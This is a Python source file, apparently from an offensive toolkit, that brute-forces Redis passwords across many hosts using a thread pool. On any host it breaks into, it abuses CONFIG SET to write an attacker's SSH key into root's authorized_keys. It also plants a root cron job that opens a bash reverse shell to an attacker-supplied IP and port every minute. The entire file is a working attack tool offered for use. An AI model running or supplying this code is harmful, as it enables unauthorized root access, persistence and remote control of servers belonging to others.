#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Project : python
@File : redis_burte.py
@Author : moresuo
@Time : 2026/6/26 17:16
@脚本说明 : redis爆破
"""
import threading

from redis import Redis

from tools.SchedulerTools import run_batch
from tools.WordlistTools import load_lines

redis_found_hosts = set()
redis_found_lock = threading.Lock()


#redis爆破
def scan_redis(host="127.0.0.1", port=6379, password="", ssh_pub_key=None, ip=None, listen_port=8888):
    key = (host, port)
    with redis_found_lock:
        if key in redis_found_hosts:
            return
    try:
        redis_cli = Redis(
            host=host,
            port=int(port),
            password=password,
            db=0,
            socket_timeout=3,
            socket_connect_timeout=3
        )
        if redis_cli.ping():
            with redis_found_lock:
                redis_found_hosts.add(key)
            redis_info = redis_cli.info()
            print("===================================================================")
            print(f"[+] {host} Redis连接成功,存在弱口令:{password}")
            print("===================================================================")
            if "Linux" not in redis_info["os"] or redis_info["redis_mode"] != "standalone" or redis_cli.config_get("protected-mode")["protected-mode"] != "no":
                print(f"[!] {host}:{port} 不满足Redis写入利用条件 ")
                redis_cli.close()
                return
            if ssh_pub_key:
                print("[+] 尝试公私钥注入")
                unauthorized_publicKey(redis_cli, ssh_pub_key)
            if ip:
                print("[+] 尝试定时任务反弹")
                unauthorized_reverseShell(redis_cli, ip, listen_port)
        redis_cli.close()
    except:
        pass


#redis公私钥未授权访问
def unauthorized_publicKey(redis_cli, ssh_pub_key):
    redis_cli.config_set("dir", "/root/.ssh")
    redis_cli.config_set("dbfilename", "authorized_keys")
    redis_cli.set("kfc", "\n\n\n\n" + ssh_pub_key + "\n\n\n\n")
    if ssh_pub_key in redis_cli.get("kfc").decode("utf-8") and redis_cli.save():
        print("[*] Redis未授权公私钥写入成功")
        redis_cli.close()


#redis反弹shell未授权
def unauthorized_reverseShell(redis_cli, ip, listen_port):
    redis_cli.config_set("dir", "/var/spool/cron")
    redis_cli.config_set("dbfilename", "root")
    reverseCommand = f"*/1 * * * * bash -i >& /dev/tcp/{ip}/{listen_port} 0>&1"
    redis_cli.set("vw50", "\n\n\n\n" + reverseCommand + "\n\n\n\n")
    if reverseCommand in redis_cli.get("vw50").decode("utf-8") and redis_cli.save():
        print("[*] Redis未授权定时任务反弹成功")
        redis_cli.close()


#线程池执行任务
def scan_redis_run(hosts, port=6379, password="", ssh_pub_key=None, ip=None, listen_port=8888, threads=500):
    redis_found_hosts.clear()
    passwords = load_lines(password)
    tasks = ((host, port, passwd, ssh_pub_key, ip, listen_port) for host in hosts for passwd in passwords)
    run_batch(tasks, scan_redis, threads)
